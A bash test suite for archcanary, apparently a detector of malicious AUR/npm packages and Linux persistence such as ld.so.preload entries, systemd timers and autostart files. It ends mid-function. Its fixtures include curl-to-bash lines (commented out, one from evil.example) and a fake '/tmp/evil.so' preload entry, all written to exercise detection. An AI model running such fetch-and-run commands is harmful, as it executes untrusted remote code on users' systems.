#!/usr/bin/env bash
#
# Matching test runner for archcanary
# Tests that package matching is exact (no prefix/suffix false positives)
# and that list parsing handles edge cases correctly.
#
# Usage:
#   ./tests/run_matching_tests.sh          # run all tests
#   ./tests/run_matching_tests.sh -v       # verbose output
#

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_DIR="$(dirname "$SCRIPT_DIR")"
VERBOSE=false
FAIL_COUNT=0
PASS_COUNT=0

[[ "${1:-}" == "-v" ]] && VERBOSE=true

msg()   { echo >&2 "  $*"; }
pass()  { echo >&2 "  PASS: $1"; PASS_COUNT=$((PASS_COUNT + 1)); }
fail()  { echo >&2 "  FAIL: $1"; FAIL_COUNT=$((FAIL_COUNT + 1)); }

# ---------------------------------------------------------------------------
# Helper: load a package list file the same way archcanary.sh does
# Returns array via nameref
# ---------------------------------------------------------------------------
load_list() {
    local file=$1
    local -n arr=$2
    arr=()
    while IFS= read -r line; do
        [[ "$line" =~ ^#.*$ || -z "$line" ]] && continue
        arr+=("$line")
    done < "$file"
}

# ---------------------------------------------------------------------------
# Helper: simulate check_current logig — filter installed list against
#          infected list (exact match only)
# ---------------------------------------------------------------------------
filter_installed() {
    local _fn="$1" _fl="$2" _fr="$3"
    local _fa=() _fb=()
    eval '_fa=("${'"$_fn"'[@]}")'
    eval '_fb=("${'"$_fl"'[@]}")'
    local _fc=()
    local _p _q
    for _p in "${_fa[@]}"; do
        local _m=""
        for _q in "${_fb[@]}"; do
            if [[ "$_p" == "$_q" ]]; then
                _m="$_q"
                break
            fi
        done
        if [[ -n "$_m" ]]; then
            _fc+=("$_p")
        fi
    done
    eval "$_fr=(\"\${_fc[@]}\")"
}

# ---------------------------------------------------------------------------
# Test 1: suffix_ambiguity — jd-gui-bin should NOT match jd-gui
# ---------------------------------------------------------------------------
test_suffix_ambiguity() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/suffix_ambiguity.txt" infected

    # Simulate installed packages including jd-gui (infected) and jd-gui-bin (not)
    local installed=("jd-gui" "jd-gui-bin" "alienfx" "alienfx-lite" "alock" "alock-git" "nss" "git")
    local matched=()
    filter_installed installed infected matched

    local expected=("jd-gui" "alienfx" "alock" "nss" "git")

    if [[ "${#matched[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${matched[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "suffix_ambiguity: exact match only (no prefix false positives)"
        else
            fail "suffix_ambiguity: matched ${matched[*]}, expected ${expected[*]}"
        fi
    else
        fail "suffix_ambiguity: got ${#matched[@]} matches, expected ${#expected[@]} (${matched[*]:-none})"
    fi
}

# ---------------------------------------------------------------------------
# Test 2: substring — short names like 'git' should not match longer names
# ---------------------------------------------------------------------------
test_substring() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/substring.txt" infected

    local installed=("git" "git-credential-manager-core-bin" "nss" "python-nss" "cuda" "cuda-12.8" "python" "python3.11")
    local matched=()
    filter_installed installed infected matched

    local expected=("git" "nss" "cuda" "python")
    if [[ "${#matched[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${matched[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "substring: git/nss/python/cuda match exactly, not suffixed variants"
        else
            fail "substring: matched ${matched[*]}, expected ${expected[*]}"
        fi
    else
        fail "substring: got ${#matched[@]} matches, expected ${#expected[@]} (${matched[*]:-none})"
    fi
}

# ---------------------------------------------------------------------------
# Test 3: empty list — should match nothing
# ---------------------------------------------------------------------------
test_empty_list() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/empty.txt" infected

    local installed=("alvr" "guiscrcpy" "jd-gui" "git")
    local matched=()
    filter_installed installed infected matched

    if [[ ${#matched[@]} -eq 0 ]]; then
        pass "empty_list: no matches from empty infected list"
    else
        fail "empty_list: got ${#matched[@]} matches from empty list"
    fi
}

# ---------------------------------------------------------------------------
# Test 4: comments parsing — comment lines and blanks are ignored
# ---------------------------------------------------------------------------
test_comments_parsing() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/comments.txt" infected

    local expected=("alvr" "guiscrcpy" "netmon-git")
    if [[ "${#infected[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${infected[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "comments_parsing: comments and blanks correctly ignored"
        else
            fail "comments_parsing: parsed ${infected[*]}, expected ${expected[*]}"
        fi
    else
        fail "comments_parsing: got ${#infected[@]} entries, expected ${#expected[@]}"
    fi
}

# ---------------------------------------------------------------------------
# Test 5: special characters — dots, plus, hyphens in package names
# ---------------------------------------------------------------------------
test_specials() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/specials.txt" infected

    local expected=("python3.11" "gcc-libs" "cuda-12.8" "ruby3.3+dev" "dot_underscore" "alac-git")
    if [[ "${#infected[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${infected[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "specials: dots/plus/hyphens parsed correctly"
        else
            fail "specials: parsed ${infected[*]}, expected ${expected[*]}"
        fi
    else
        fail "specials: got ${#infected[@]} entries, expected ${#expected[@]}"
    fi
}

# ---------------------------------------------------------------------------
# Test 6: --package-list CLI flag integration
# ---------------------------------------------------------------------------
test_cli_flag() {
    local log_file
    log_file=$(mktemp)

    # Run via env var (existing path)
    # Pin chaos-rat/russian-spam/aur-audit lists to an empty fixture so the
    # count isn't inflated by real lists cached under this machine's
    # ~/.config/archcanary (aur-audit has no CLI override flag by design —
    # env var is the only pin point, same as PACKAGE_LIST_FILE below).
    local result=0
    PACKAGE_LIST_FILE="$SCRIPT_DIR/fake_package_lists/simple.txt" \
    AUR_AUDIT_BLACK_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
    AUR_AUDIT_RED_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
    "$REPO_DIR/archcanary.sh" \
        --chaos-rat-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        --russian-spam-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        --log-file="$log_file" >/dev/null 2>&1 || true
    grep -q "Packages checked: 10" "$log_file" || result=$?

    if [[ $result -eq 0 ]]; then
        pass "cli_flag: PACKAGE_LIST_FILE env loads 10 packages"
    else
        # Try with direct --package-list flag
        result=0
        AUR_AUDIT_BLACK_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        AUR_AUDIT_RED_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        "$REPO_DIR/archcanary.sh" \
            --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
            --chaos-rat-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
            --russian-spam-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
            --log-file="$log_file" >/dev/null 2>&1 || true
        grep -q "Packages checked: 10" "$log_file" || result=$?
        if [[ $result -eq 0 ]]; then
            pass "cli_flag: --package-list=PATH loads 10 packages"
        else
            fail "cli_flag: could not verify package count"
        fi
    fi

    rm -f "$log_file"
}

# ---------------------------------------------------------------------------
# Test 7: --malicious-npm-list CLI flag integration
# ---------------------------------------------------------------------------
test_npm_cli_flag() {
    local log_file
    log_file=$(mktemp)

    "$REPO_DIR/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" \
        --log-file="$log_file" >/dev/null 2>&1 || true

    if grep -q "malicious_npm.txt" "$log_file"; then
        pass "npm_cli_flag: --malicious-npm-list=PATH accepted"
    elif grep -q "Packages checked:" "$log_file"; then
        pass "npm_cli_flag: script ran successfully with custom npm list"
    else
        fail "npm_cli_flag: script failed with custom npm list"
    fi

    rm -f "$log_file"
}

# ---------------------------------------------------------------------------
# Test 8: verify actual repo package_list.txt is parseable (no corrupt lines)
# ---------------------------------------------------------------------------
test_actual_list_integrity() {
    local infected=()
    load_list "$REPO_DIR/lists/package_list.txt" infected

    if [[ ${#infected[@]} -gt 500 ]]; then
        pass "actual_list: parsed ${#infected[@]} packages from package_list.txt"
    else
        fail "actual_list: only got ${#infected[@]} packages (expected >500)"
    fi
}

# ---------------------------------------------------------------------------
# Test 9: check_ldso — detects non-empty /etc/ld.so.preload
# ---------------------------------------------------------------------------
test_check_ldso() {
    local tmpdir preload_file conf_dir
    tmpdir=$(mktemp -d)
    preload_file="$tmpdir/ld.so.preload"
    conf_dir="$tmpdir/ld.so.conf.d"
    mkdir -p "$conf_dir"

    local out rc=0

    # Sub-test A: absent/empty preload, empty conf.d → clean
    rc=0
    out=$(LDSO_PRELOAD_FILE="$preload_file" LDSO_CONF_DIR="$conf_dir" \
        "$REPO_DIR/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" \
        --check-ldso --no-notify 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_ldso: absent preload → clean"
    else
        fail "check_ldso: absent preload → expected clean, got: $out"
    fi

    # Sub-test B: non-empty preload → WARNING (exit 2)
    echo "/tmp/evil.so" > "$preload_file"
    rc=0
    out=$(LDSO_PRELOAD_FILE="$preload_file" LDSO_CONF_DIR="$conf_dir" \
        "$REPO_DIR/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" \
        --check-ldso --no-notify 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* && "$out" == *"evil.so"* ]]; then
        pass "check_ldso: non-empty preload → WARNING (exit 2) with library listed"
    else
        fail "check_ldso: non-empty preload → expected WARNING+exit2, got rc=$rc"
    fi

    rm -rf "$tmpdir"
}

# ---------------------------------------------------------------------------
# Test 10: check_systemd hardened — drop-ins, timers, wider Restart= match
# ---------------------------------------------------------------------------
test_check_systemd_hardened() {
    local fixture_dir="$SCRIPT_DIR/systemd"
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-systemd --no-notify
    )

    local out rc=0

    # Sub-test A: drop-in override with Restart=on-failure → WARNING
    out=$(SYSTEMD_SCAN_DIRS="$fixture_dir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* && "$out" == *"on-failure"* ]]; then
        pass "check_systemd: drop-in Restart=on-failure → WARNING (exit 2)"
    else
        fail "check_systemd: drop-in Restart=on-failure → expected WARNING+exit2, got rc=$rc"
    fi

    # Sub-test B: timer with OnBootSec + Persistent=true → WARNING
    if [[ "$out" == *"timer"* || "$out" == *"Persistent"* ]]; then
        pass "check_systemd: OnBootSec+Persistent timer → WARNING"
    else
        fail "check_systemd: timer not detected — got: $out"
    fi

    # Sub-test C: empty dir → clean
    local tmpdir
    tmpdir=$(mktemp -d)
    rc=0
    out=$(SYSTEMD_SCAN_DIRS="$tmpdir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_systemd: empty scan dir → clean"
    else
        fail "check_systemd: empty dir → expected clean, got: $out"
    fi
    rm -rf "$tmpdir"

    # Sub-test D: allowlisted unit names → INFO, no WARNING, exit 0 (clean)
    local allow_file
    allow_file=$(mktemp)
    printf 'fake-persist.service\nfake-persist.timer\n' > "$allow_file"
    rc=0
    out=$(SYSTEMD_SCAN_DIRS="$fixture_dir" SYSTEMD_ALLOWLIST_FILE="$allow_file" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"INFO: systemd unit allowlisted"* \
          && "$out" == *"INFO: systemd timer allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_systemd: allowlisted unit/timer → INFO only, exit 0 (clean)"
    else
        fail "check_systemd: allowlisted unit/timer → expected INFO+exit0, got rc=$rc, out: $out"
    fi
    rm -f "$allow_file"
}

# ---------------------------------------------------------------------------
# Test 11: check_autostart — suspicious .desktop and shell RC detection
# ---------------------------------------------------------------------------
test_check_autostart() {
    local fake_home="$SCRIPT_DIR/fake_home"
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-autostart --no-notify
    )
    local out rc=0

    # Sub-test A: fixture home with evil.desktop + malicious .bashrc → WARNING
    rc=0
    out=$(AUTOSTART_HOME="$fake_home" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* ]]; then
        pass "check_autostart: evil.desktop + malicious .bashrc → WARNING (exit 2)"
    else
        fail "check_autostart: expected WARNING+exit2, got rc=$rc"
    fi

    # Sub-test B: evil.desktop is flagged, clean.desktop is not
    if [[ "$out" == *"evil.desktop"* && "$out" != *"clean.desktop"* ]]; then
        pass "check_autostart: evil.desktop flagged, clean.desktop not flagged"
    else
        fail "check_autostart: desktop filtering wrong — out: $out"
    fi

    # Sub-test C: .bashrc curl|bash pattern detected
    if [[ "$out" == *".bashrc"* ]]; then
        pass "check_autostart: curl|bash in .bashrc detected"
    else
        fail "check_autostart: .bashrc pattern not detected — out: $out"
    fi

    # Sub-test D: clean home dir → clean
    local tmpdir
    tmpdir=$(mktemp -d)
    mkdir -p "$tmpdir/.config/autostart"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: empty home → clean"
    else
        fail "check_autostart: empty home → expected clean, got: $out"
    fi
    rm -rf "$tmpdir"

    # Sub-test E: bare Exec= name unresolvable via $PATH but found in a
    # non-PATH libdir (simulates e.g. /usr/lib/zeitgeist/zeitgeist-datahub) → clean
    local tmpdir2 libdir
    tmpdir2=$(mktemp -d)
    libdir=$(mktemp -d)
    mkdir -p "$tmpdir2/.config/autostart" "$libdir/fakepkg"
    cat > "$tmpdir2/.config/autostart/fakepkg.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=FakePkg
Exec=fakepkg-helper
DESK
    printf '#!/bin/sh\n' > "$libdir/fakepkg/fakepkg-helper"
    chmod +x "$libdir/fakepkg/fakepkg-helper"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir2" AUTOSTART_LIBDIRS="$libdir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: bare Exec= resolved via non-PATH libdir fallback → clean"
    else
        fail "check_autostart: non-PATH fallback resolution failed, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir2" "$libdir"

    # Sub-test F: bare Exec= name unresolvable anywhere, not allowlisted → WARNING
    local tmpdir3
    tmpdir3=$(mktemp -d)
    mkdir -p "$tmpdir3/.config/autostart"
    cat > "$tmpdir3/.config/autostart/unresolved.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=Unresolved
Exec=totally-unresolvable-binary
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir3" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: suspicious autostart entry"* ]]; then
        pass "check_autostart: unresolved bare Exec=, not allowlisted → WARNING"
    else
        fail "check_autostart: unresolved bare Exec= regression, rc=$rc, out: $out"
    fi

    # Sub-test G: same unresolvable binary, but allowlisted → INFO only, exit 0
    local allow_file2
    allow_file2=$(mktemp)
    printf 'totally-unresolvable-binary\n' > "$allow_file2"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir3" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        AUTOSTART_ALLOWLIST_FILE="$allow_file2" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"INFO: autostart entry allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: allowlisted unresolved Exec= → INFO only, exit 0 (clean)"
    else
        fail "check_autostart: allowlisted unresolved Exec= → expected INFO+exit0, got rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir3"
    rm -f "$allow_file2"

    # Sub-test H: glob metacharacters in Exec= must not act as a find(1)
    # wildcard — a literal "*" must not match an unrelated executable in the
    # libdir and silently bypass the check (regression test for the
    # glob-injection fix: find -name treats its argument as a pattern unless
    # escaped, so an unescaped "*" would match the first executable found).
    local tmpdir4 libdir2
    tmpdir4=$(mktemp -d)
    libdir2=$(mktemp -d)
    mkdir -p "$tmpdir4/.config/autostart" "$libdir2/somepkg"
    printf '#!/bin/sh\n' > "$libdir2/somepkg/some-real-helper"
    chmod +x "$libdir2/somepkg/some-real-helper"
    cat > "$tmpdir4/.config/autostart/glob.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=GlobAttempt
Exec=*
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir4" AUTOSTART_LIBDIRS="$libdir2" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: suspicious autostart entry"* ]]; then
        pass "check_autostart: glob metacharacter Exec=* does not bypass via find wildcard match"
    else
        fail "check_autostart: glob-injection regression — Exec=* should still WARNING, got rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir4" "$libdir2"

    # Sub-test I: Hidden=true entry with an unresolvable Exec= must NOT warn —
    # per the XDG spec this is how DE autostart managers (Mabox included)
    # disable an entry without deleting the file; it can never execute, so
    # there is nothing to flag regardless of whether Exec= resolves.
    local tmpdir5
    tmpdir5=$(mktemp -d)
    mkdir -p "$tmpdir5/.config/autostart"
    cat > "$tmpdir5/.config/autostart/hidden.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=Hidden
Exec=totally-unresolvable-binary
Hidden=true
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir5" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: Hidden=true entry skipped even with unresolvable Exec="
    else
        fail "check_autostart: Hidden=true entry should be skipped, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir5"

    # Sub-test J: X-GNOME-Autostart-enabled=false behaves the same as Hidden=true
    local tmpdir6
    tmpdir6=$(mktemp -d)
    mkdir -p "$tmpdir6/.config/autostart"
    cat > "$tmpdir6/.config/autostart/gnome-disabled.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=GnomeDisabled
Exec=totally-unresolvable-binary
X-GNOME-Autostart-enabled=false
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir6" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: X-GNOME-Autostart-enabled=false entry skipped"
    else
        fail "check_autostart: X-GNOME-Autostart-enabled=false should be skipped, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir6"

    # Sub-test K: user systemd service with an unowned ExecStart binary, not
    # allowlisted → WARNING (regression guard — this branch had zero test
    # coverage before the allowlist fix below was added). Pins
    # AUTOSTART_ALLOWLIST_FILE to a nonexistent path so this can't spuriously
    # pass/fail depending on whatever the real /etc/archcanary allowlist
    # happens to contain on the machine running the suite (e.g. after
    # running --allowlist-add=autostart against this exact fixture path).
    local tmpdir7
    tmpdir7=$(mktemp -d)
    mkdir -p "$tmpdir7/.config/systemd/user"
    cat > "$tmpdir7/.config/systemd/user/eos-update-notifier.service" << 'SVC'
[Unit]
Description=fake unowned service

[Service]
Type=oneshot
ExecStart=/opt/fake-unowned-pkg/eos-update-notifier
SVC
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir7" AUTOSTART_ALLOWLIST_FILE="/nonexistent-allowlist-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: user service with unowned ExecStart binary"* ]]; then
        pass "check_autostart: user service with unowned ExecStart, not allowlisted → WARNING"
    else
        fail "check_autostart: user service unowned-ExecStart regression, rc=$rc, out: $out"
    fi

    # Sub-test L: same unowned ExecStart binary, allowlisted by its exact
    # full path → INFO only, exit 0 (the eos-update-notifier case: the
    # package ships its user unit via /etc/skel, so the copy materialized
    # into ~/.config/systemd/user/ at account creation is never itself
    # pacman-tracked even though the binary path normally would be). Uses
    # the full ExecStart path, not just the basename — matching on basename
    # alone would let an unrelated binary sharing that name anywhere on disk
    # slip through, which is exactly what the full-path match here guards
    # against (see the sibling failure-mode note on the WARNING case above).
    local allow_file3
    allow_file3=$(mktemp)
    printf '/opt/fake-unowned-pkg/eos-update-notifier\n' > "$allow_file3"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir7" AUTOSTART_ALLOWLIST_FILE="$allow_file3" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"INFO: user service allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: user service unowned ExecStart, allowlisted → INFO only, exit 0"
    else
        fail "check_autostart: allowlisted user service ExecStart → expected INFO+exit0, got rc=$rc, out: $out"
    fi

    # Sub-test M: allowlisting only the basename (not the full path) must NOT
    # suppress the warning — regression guard for the basename-match bypass
    # found in code review (an attacker-placed binary anywhere on disk
    # sharing a legitimately-allowlisted basename must still be flagged).
    local allow_file4
    allow_file4=$(mktemp)
    printf 'eos-update-notifier\n' > "$allow_file4"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir7" AUTOSTART_ALLOWLIST_FILE="$allow_file4" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: user service with unowned ExecStart binary"* ]]; then
        pass "check_autostart: basename-only allowlist entry does not suppress full-path finding"
    else
        fail "check_autostart: basename-only allowlist entry should NOT match, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir7"
    rm -f "$allow_file3" "$allow_file4"

    # Sub-test N: absolute .desktop Exec= path under $HOME/bin or
    # $HOME/.local/bin must NOT be flagged — regression guard for a real
    # false positive (Conky's LXQt-generated autostart entry pointing at a
    # personal launcher script in ~/bin).
    local tmpdir8
    tmpdir8=$(mktemp -d)
    mkdir -p "$tmpdir8/.config/autostart" "$tmpdir8/bin" "$tmpdir8/.local/bin"
    cat > "$tmpdir8/.config/autostart/conky.desktop" << DESK
[Desktop Entry]
Type=Application
Name=Conky
Exec=$tmpdir8/bin/conky-start.sh
DESK
    cat > "$tmpdir8/.config/autostart/localbin.desktop" << DESK
[Desktop Entry]
Type=Application
Name=LocalBinThing
Exec=$tmpdir8/.local/bin/something.sh
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir8" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: absolute Exec= under \$HOME/bin or \$HOME/.local/bin not flagged"
    else
        fail "check_autostart: \$HOME/bin false positive regression, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir8"

    # Sub-test O: a fully commented-out line matching a dangerous shell-RC
    # pattern must NOT be flagged — regression guard for a real false
    # positive (a user kept an old, disabled alias as a commented-out note
    # referencing the original AUR incident).
    local tmpdir9
    tmpdir9=$(mktemp -d)
    cat > "$tmpdir9/.bashrc" << 'RC'
echo hello
# alias ckaur='curl -s https://cscs.pastes.sh/raw/aurvulntest20260611.sh | bash'  #<----[ check for the new aur vulnerability (06-2026)
    # indented comment: curl -s https://evil.example | bash
RC
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir9" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: commented-out shell RC pattern not flagged"
    else
        fail "check_autostart: commented-out RC line false positive regression, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir9"

    # Sub-test P: summary table shows "REVIEW" (not "INFECTED") for a genuine
    # autostart finding, and the WARNING text includes the allowlist
    # self-service hint — reported live by two separate users whose
    # legitimate autostart entries produced an alarming "INFECTED" verdict
    # with no indication a fix (allowlisting) even existed.
    local tmpdir10
    tmpdir10=$(mktemp -d)
    mkdir -p "$tmpdir10/.config/autostart"
    cat > "$tmpdir10/.config/autostart/someapp.desktop" << DESK
[Desktop Entry]
Type=Application
Name=SomeApp
Exec=$tmpdir10/Applications/SomeApp.AppImage
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir10" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --no-color 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"REVIEW"* && "$out" != *"INFECTED"* && \
          "$out" == *"--allowlist-add=autostart:"* ]]; then
        pass "check_autostart: summary shows REVIEW + allowlist hint present"
    else
        fail "check_autostart: expected REVIEW wording + allowlist hint, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir10"

    # Sub-test Q: a Flatpak app resolved via $PATH (flatpak-bindir.sh puts
    # Flatpak's export dir on PATH on any Flatpak-enabled system) must NOT
    # be flagged — regression guard for a real false positive (Gearlever,
    # MEGAsync, Eloquent all reported live as "suspicious").
    local tmpdir11
    tmpdir11=$(mktemp -d)
    mkdir -p "$tmpdir11/.config/autostart" "$tmpdir11/.local/share/flatpak/exports/bin"
    cat > "$tmpdir11/.config/autostart/flatpakapp.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=FlatpakApp
Exec=re.sonny.Eloquent
DESK
    ln -s /bin/true "$tmpdir11/.local/share/flatpak/exports/bin/re.sonny.Eloquent"
    rc=0
    out=$(PATH="$tmpdir11/.local/share/flatpak/exports/bin:$PATH" AUTOSTART_HOME="$tmpdir11" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: Flatpak app resolved via \$PATH not flagged"
    else
        fail "check_autostart: Flatpak-on-PATH false positive regression, rc=$rc, out: $out"
    fi

    # Sub-test R: same Flatpak app, but NOT on $PATH (e.g. a minimal/cron-like
    # scan environment) — must still resolve via the non-PATH libdir search
    # now that Flatpak's export dirs are searched by default.
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir11" \
        AUTOSTART_LIBDIRS="/usr/lib:/usr/libexec:/var/lib/flatpak/exports/bin:$tmpdir11/.local/share/flatpak/exports/bin" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: Flatpak app resolved via non-PATH libdir search not flagged"
    else
        fail "check_autostart: Flatpak libdir-fallback regression, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir11"

    # Sub-test S: a quoted Exec= value (e.g. pCloud's installer wraps its
    # launcher path in literal double quotes even with no spaces to quote)
    # must have the quotes stripped before classification/display/allowlist
    # matching — otherwise it's misclassified as an unresolvable bare name
    # (starts with '"' not '/'), and the value is un-allowlistable: a real
    # shell strips the quotes when the user types the suggested
    # --allowlist-add command, so the stored value could never match the
    # raw, still-quoted one used for comparison. Reported live.
    local tmpdir12
    tmpdir12=$(mktemp -d)
    mkdir -p "$tmpdir12/.config/autostart"
    cat > "$tmpdir12/.config/autostart/pcloud.desktop" << DESK
[Desktop Entry]
Type=Application
Name=pCloud
Exec="$tmpdir12/pcloud-launcher.sh"
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir12" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --no-color 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"Exec=$tmpdir12/pcloud-launcher.sh (outside"* && \
          "$out" == *"--allowlist-add=autostart:$tmpdir12/pcloud-launcher.sh"* ]]; then
        pass "check_autostart: quoted Exec= value has quotes stripped in WARNING/hint text"
    else
        fail "check_autostart: quoted Exec= should show unquoted value, rc=$rc, out: $out"
    fi

    local allow_file5
    allow_file5=$(mktemp)
    printf '%s\n' "$tmpdir12/pcloud-launcher.sh" > "$allow_file5"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir12" AUTOSTART_ALLOWLIST_FILE="$allow_file5" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: quoted Exec= value allowlisted with unquoted path matches"
    else
        fail "check_autostart: allowlisting the unquoted path should match quoted Exec=, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir12"
